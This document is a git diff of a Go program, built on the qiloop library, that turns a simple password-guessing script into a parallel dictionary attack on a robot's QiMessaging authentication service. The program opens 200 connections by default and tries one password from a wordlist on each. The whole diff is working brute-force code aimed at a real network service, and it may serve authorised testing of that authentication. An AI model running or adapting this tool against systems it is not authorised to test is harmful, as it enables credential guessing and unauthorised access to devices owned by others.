@@ -3,62 +3,36 @@ package main
 import (
 	"bufio"
 	"flag"
-	"github.com/lugu/qiloop/bus"
-	"github.com/lugu/qiloop/bus/net"
+	"fmt"
 	"log"
 	"os"
-	"time"
+	"sync"
+
+	"github.com/lugu/qiloop/bus"
+	"github.com/lugu/qiloop/bus/net"
 )
 
-func Fuzz(data []byte) int {
-	return 0
+type tester struct {
+	endpoint    net.EndPoint
+	user, token string
 }
 
-func test(endpoint net.EndPoint, user, token string, i int) {
-	log.Printf("Authentication attempt: %d", i)
-	err := bus.AuthenticateUser(endpoint, user, token)
-	if err == nil {
-		log.Printf("Authentication succedded: %s", token)
-		exit(0)
-	} else {
-		log.Printf("Authentication failed: %s", token)
-	}
-}
-
-func exit(status int) {
-	duration, _ := time.ParseDuration("1s")
-	time.Sleep(duration)
-	log.Fatalf("exiting...")
-}
-
-func filter(hdr *net.Header) (matched bool, keep bool) {
-	log.Printf("received response (%d)", hdr.ID)
-	return false, true
-}
-
-func consumer(msg *net.Message) error {
-	return nil
-}
-
-func closer(err error) {
-	exit(1)
+func (t tester) test() error {
+	return bus.AuthenticateUser(t.endpoint, t.user, t.token)
 }
 
 func main() {
-	var serverURL = flag.String("qi-url", "tcp://127.0.0.1:9559",
+	var serverURL = flag.String("qi-url", "tcps://robot:9503",
 		"server address")
-	var dictionnary = flag.String("dictionary", "", "dictionary file")
+	var width = flag.Int("width", 200, "number of parrallel connections")
+	var dictionnary = flag.String("dict", "dictionnary.txt", "dictionary file")
 	var user = flag.String("user", "", "auth user")
 
 	flag.Parse()
 
-	endpoint, err := net.DialEndPoint(*serverURL)
-	if err != nil {
-		log.Fatalf("failed to contact %s: %s", *serverURL, err)
+	if *dictionnary == "" {
+		log.Fatalf("missing dictionnary parameter")
 	}
-
-	endpoint.AddHandler(filter, consumer, closer)
-
 	file, err := os.Open(*dictionnary)
 	if err != nil {
 		log.Fatalf("failed to open %s: %s", *dictionnary, err)
@@ -67,12 +41,40 @@ func main() {
 	defer file.Close()
 	r := bufio.NewReader(file)
 
-	for i := 0; i < 10; i++ {
+	testers := make([]tester, *width)
+
+	// 1. establish N connections
+	for i := 0; i < *width; i++ {
 		password, err := r.ReadString('\n')
 		if err != nil {
 			log.Fatalf("failed to read password: %s", err)
 		}
-		go test(endpoint, *user, password, i)
+
+		println("connecting... ", i)
+		endpoint, err := net.DialEndPoint(*serverURL)
+		if err != nil {
+			log.Fatalf("failed to contact %s: %s", *serverURL, err)
+		}
+
+		testers[i] = tester{
+			endpoint: endpoint,
+			user:     *user,
+			token:    password,
+		}
+		// time.Sleep(5 * time.Second)
 	}
-	time.Sleep(time.Hour * 10)
+
+	// 2. try N authentications in parrallel
+	var wait sync.WaitGroup
+	wait.Add(*width)
+	for i := 0; i < *width; i++ {
+		go func(t tester) {
+			err := t.test()
+			fmt.Printf("tester %s\n", err)
+			wait.Done()
+		}(testers[i])
+	}
+	println("waiting...")
+	wait.Wait()
+	println("done.")
 }
